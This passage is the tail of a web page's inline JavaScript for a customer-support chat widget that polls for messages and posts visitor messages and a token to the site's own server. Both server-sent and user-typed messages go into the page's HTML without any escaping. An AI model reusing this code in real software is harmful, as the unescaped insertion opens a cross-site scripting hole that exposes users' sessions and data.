xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send("get=0&token=" + token);
xhttp.onload = function (e) {
if (xhttp.readyState === 4) {
  if (xhttp.status === 200) {
    var body = xhttp.response;
    pool = true;
    var json = JSON.parse(body);
    for (let i = 0; i < json.length; i++) {
      cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
      if (json[i].sender == 't') {
        text = '<div class="operators-msg" style="display: flex;"><div class="operators-photo"><img src="ordercss/operator-img.png"></div><div class="operators-msg-text" id="qwe1649370682">'+ json[i].message +'</div></div>'
      } else if (json[i].sender == 'i') {
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }else if (json[i].sender == "testOnline"){
        return 'okay';
      }else{
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }

      
      $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + text);
      var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
      objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
      supportwindow.style.opacity = '1';
      supportwindow.style.visibility = 'visible';
    }

  } else {
    pool = true;
  }
}
}
}
}
}

function sendMessage() {
message = document.getElementById("smstosup1").value;
if (message === '') {
return;
}
document.getElementById("smstosup1").value = '';
var token = document.getElementById("refresh_time").value;
if (token === null) {
var token = Math.random().toString(36).substring(7);
}
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
var uid = document.getElementById("home_time").value;
var title = document.getElementById("product").value;
xhttp.send("send=1&track_id=" + encodeURIComponent(track_id) + "&uid=" + encodeURIComponent(uid) + "&token=" + encodeURIComponent(token) + "&message=" + encodeURIComponent(message) + "&type=" + encodeURIComponent(window.location.host.split('.')[0]) + "&title=" + encodeURIComponent(title));
cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
$('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + '<div class="visitors-msg-text" id="qwe1649370526">'+ message +'</div>');
setCookie('token', token);
var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
}

function setCookie(cname, cvalue) {
var d = new Date();
d.setTime(d.getTime() + (6 * 60 * 60 * 1000));
var expires = "expires=" + d.toUTCString();
document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

</script>
</div></body></html>